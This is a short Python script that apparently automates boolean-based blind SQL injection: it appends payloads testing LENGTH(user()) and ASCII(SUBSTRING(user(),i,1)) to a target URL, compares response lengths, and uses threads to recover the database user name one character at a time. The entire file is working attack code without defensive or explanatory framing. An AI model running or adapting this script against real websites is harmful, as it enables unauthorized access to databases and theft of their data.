from MRequest.request import *
import threading 

class T:
    def get_length(self,url):
        a = NRequests()
        a.sendGet(url)
        len_source=len(a.source())
        dem=0
        while True:
            b=NRequests()
            payload=" and LENGTH(user())={0}-- -".format(dem)
            b.sendGet(url+payload)
            if len_source==len(b.source()):
                return dem
            dem+=1

    def get_char(self,url,total):
        self.s=['']*int(total+1)
        a = NRequests()
        a.sendGet(url)
        len_source=len(a.source())
        for i in range(1,total+1):
            t = threading.Thread(target=self.scan,args=(url,i,len_source,total))
            t.start()
        
    def scan(self,url,index,len_source,total):
        m=''
        for j in range(32,256):
                b=NRequests()
                payload = " and ASCII(SUBSTRING(user(),{0},1))={1}-- -".format(index,j)
                b.sendGet(url+payload)
                if len_source==len(b.source()):
                    self.s[index-1]=chr(j)
                    for z in self.s:
                        m+=z
                        print(m)
                    break
